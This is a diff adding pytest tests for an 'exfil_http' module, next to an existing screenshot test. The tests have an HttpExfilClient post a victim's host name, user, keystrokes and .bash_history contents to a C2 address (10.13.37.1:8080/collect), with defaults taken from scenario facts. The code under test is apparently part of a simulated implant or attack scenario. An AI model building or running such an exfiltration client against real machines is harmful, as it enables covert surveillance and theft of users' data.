@@ -137,3 +137,65 @@ def test_take_screenshot_invokes_scrot_with_output_path(tmp_path, monkeypatch):
     assert ok is True
     assert calls == [["/usr/bin/scrot", "--overwrite", str(out_path)]]
     assert out_path.exists()
+
+
+# --- HTTP exfil ------------------------------------------------------------
+
+def test_http_exfil_module_importable():
+    import exfil_http  # noqa: F401
+
+
+def test_http_exfil_posts_plaintext_json(monkeypatch):
+    import exfil_http
+
+    captured = {}
+
+    def fake_post(url, json=None, timeout=None, **kw):
+        captured["url"] = url
+        captured["json"] = json
+        captured["timeout"] = timeout
+
+        class _R:
+            status_code = 200
+
+            def raise_for_status(self):
+                pass
+
+        return _R()
+
+    monkeypatch.setattr("requests.post", fake_post)
+
+    client = exfil_http.HttpExfilClient(host="10.13.37.1", port=8080)
+    ok = client.send({
+        "host": "workstation-042",
+        "user": "analyst",
+        "keys": ["h", "i"],
+        "files": {".bash_history": "ls -la\n"},
+    })
+
+    assert ok is True
+    assert captured["url"] == "http://10.13.37.1:8080/collect"
+    assert captured["json"]["host"] == "workstation-042"
+    assert captured["json"]["keys"] == ["h", "i"]
+    assert captured["timeout"] == 10
+
+
+def test_http_exfil_returns_false_on_network_error(monkeypatch):
+    import exfil_http
+    import requests
+
+    def fake_post(*a, **kw):
+        raise requests.ConnectionError("c2 unreachable")
+
+    monkeypatch.setattr("requests.post", fake_post)
+    client = exfil_http.HttpExfilClient(host="10.13.37.1", port=8080)
+    assert client.send({"ping": 1}) is False
+
+
+def test_http_exfil_uses_scenario_facts_defaults(monkeypatch):
+    """Constructor without args should pull C2_IP and C2_HTTP_PORT from scenario_facts."""
+    import exfil_http
+    client = exfil_http.HttpExfilClient()
+    from generators.data import scenario_facts as sf
+    assert client.host == sf.C2_IP
+    assert client.port == sf.C2_HTTP_PORT
